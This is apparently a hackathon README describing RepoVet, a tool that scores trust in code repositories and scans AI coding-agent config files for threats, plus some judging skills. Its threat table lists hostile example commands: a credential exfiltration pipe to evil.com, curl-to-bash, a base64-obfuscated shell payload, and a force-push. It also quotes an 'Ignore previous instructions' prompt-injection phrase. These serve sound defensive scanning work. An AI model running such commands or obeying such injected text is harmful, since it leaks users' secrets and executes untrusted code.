# Skillathon 2026

Work from the March 7, 2026 Agent Skills Hackathon (SF).

---

## RepoVet — Veterinary Checkups for Code Repositories

**"Should I trust this repo?"** — We answer that question.

A trust assessment system that combines git history analysis, project health metrics, and agent configuration security scanning to produce a trust score (0-10) with detailed evidence.

### The Problem

You're about to clone a repo, install a library, or point Claude Code at a new project. Should you trust it? Today you manually scroll commits, check contributors, and hope you don't miss anything.

### How It Works

**Three Pillars of Trust**:

| Pillar | What It Checks | Scripts/Skills |
|--------|---------------|----------------|
| **Project Health** | Contributors, velocity, bus factor, review culture | git-history-to-csv.py, github-to-csv.py |
| **Code Security** | CVE history, security commits, secrets, force-pushes | security-history-analysis |
| **Config Safety** | Agent config files (.claude, .cursor, copilot) for malicious code | repovet-config-discover.py + 7 threat skills |

Trust Score = weighted average. If config threats are critical, they dominate the score.

### What Makes This Novel

Scans agent configuration files across **all major AI coding tools** for:

| Threat | Example |
|--------|---------|
| Auto-execution | `.claude/hooks/pre-command.sh` runs on every command |
| Network exfil | `cat ~/.bashrc \| curl evil.com` |
| Remote code execution | `curl url \| bash` |
| Credential theft | Reading `~/.aws/credentials`, `$GITHUB_TOKEN` |
| Obfuscation | `echo "..." \| base64 -d \| bash` |
| Destructive ops | `git push --force origin main` |
| Prompt injection | "Ignore previous instructions" in CLAUDE.md |

**Key insight**: Scans recursively because users can `cd` into any subdirectory and launch an agent from there — nested `.claude/` directories are a real attack vector.

### Components

**Scripts** (deterministic data extraction):
- `scripts/git-history-to-csv.py` — Git commits, authors, language stats, PR enrichment
- `scripts/github-to-csv.py` — PRs, issues, reviews, bot activity via GraphQL
- `scripts/repovet-config-discover.py` — Finds all agent config files, extracts executables

**Skills** (13 total):

| Tier | Skills |
|------|--------|
| Data Extraction | `git-commit-intel`, `github-project-intel` |
| Analysis | `contributor-analysis`, `repo-health-analysis`, `security-history-analysis` |
| Threat Detection | `threat-auto-execution`, `threat-network-exfil`, `threat-remote-code-execution`, `threat-credential-access`, `threat-obfuscation`, `threat-repo-write`, `threat-prompt-injection` |
| Orchestration | `repo-trust-assessment` |

**Test Repos** (`examples/test-repos/`):
- `safe-repo/` — Clean, no threats (expected: 8-9/10)
- `malicious-repo/` — Malicious hooks, exfil, nested configs, obfuscation (expected: 1-3/10)
- `borderline-repo/` — Overly permissive but not malicious (expected: 5-7/10)

### Discovery Script Results

```
safe-repo:       2 config files, 0 executables, 0 nested, 0 permissions
malicious-repo:  7 config files, 4 executables, 1 nested, 4 permissions
borderline-repo: 3 config files, 0 executables, 0 nested, 3 permissions
```

### Storage

All outputs cached in `~/.repovet/cache/{repo-name}/` — shareable via git for team assessments.

---

## Judge Panel — Hackathon Judging Tools

Meta-skills for evaluating agent skill submissions during the hackathon.

**8 skills** — one per judge/organizer:
- `judge-bence-nagy` (Anthropic), `judge-ryan-marten` (Harbor), `judge-xiangyi-li` (SkillsBench)
- `judge-belinda-mo` (Sundial), `judge-furqan-rydhan`, `judge-roey-ben-chaim` (Zenity), `judge-grace-zhang` (World Intelligence)
- `judge-panel` — Orchestrator for multi-judge consensus

**Tools**: `build_dashboard.py`, `gather_stats.py` — dashboard analyzing 86K+ skills from registries

---

## Documentation

| Doc | What |
|-----|------|
| [Build Guide](BUILD-GUIDE.md) | Full implementation specs for all components |
| [Hackathon Guide](hackathon.md) | SkillsBench findings, task format, strategy |
| [Design: Overview](ideas/repovet-overview.md) | RepoVet architecture |
| [Design: Threat Model](ideas/claude-config-audit-design.md) | Security threat analysis |
| [Design: Agent Config Inventory](ideas/agent-config-files-inventory.md) | All AI tool config files |
| [Design: Storage](ideas/data-storage-architecture.md) | `~/.repovet/` architecture |
| [Design: Future](ideas/future-enhancements.md) | Change detection, sharing |

---

## Status

| Component | Status |
|-----------|--------|
| Design docs | Done |
| git-history-to-csv.py | Done |
| github-to-csv.py | Done |
| repovet-config-discover.py | Done |
| 13 SKILL.md files | Done |
| 3 test repos | Done |
| Harbor benchmark task | TODO |
| End-to-end eval | TODO |
